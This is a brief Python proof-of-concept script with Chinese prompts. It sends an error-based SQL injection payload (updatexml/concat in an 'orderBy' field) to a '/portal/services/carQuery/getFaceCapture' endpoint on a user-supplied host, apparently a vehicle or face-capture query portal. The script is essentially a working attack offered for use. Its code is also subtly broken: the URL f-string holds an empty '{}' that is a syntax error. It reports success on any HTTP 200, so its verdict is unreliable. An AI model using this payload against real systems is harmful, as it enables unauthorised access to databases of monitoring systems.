import requests  
  
host = input("请输入目标主机地址：")  
  
headers = {  
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",  
    "Accept-Encoding": "gzip, deflate"  
}  
  
payload = "{}\n{\n\"orderBy\":\"1 and 1=updatexml(1,concat(0x7e,(select md5(388609)),0x7e),1)--\"\n}\n/extend/{}"  
  
url = f"http://{host}/portal/services/carQuery/getFaceCapture/searchJson/{payload}/pageJson/{}"  
  
response = requests.get(url, headers=headers)  
  
if response.status_code == 200:  
    print("SQL注入成功！")  
else:  
    print("SQL注入失败。")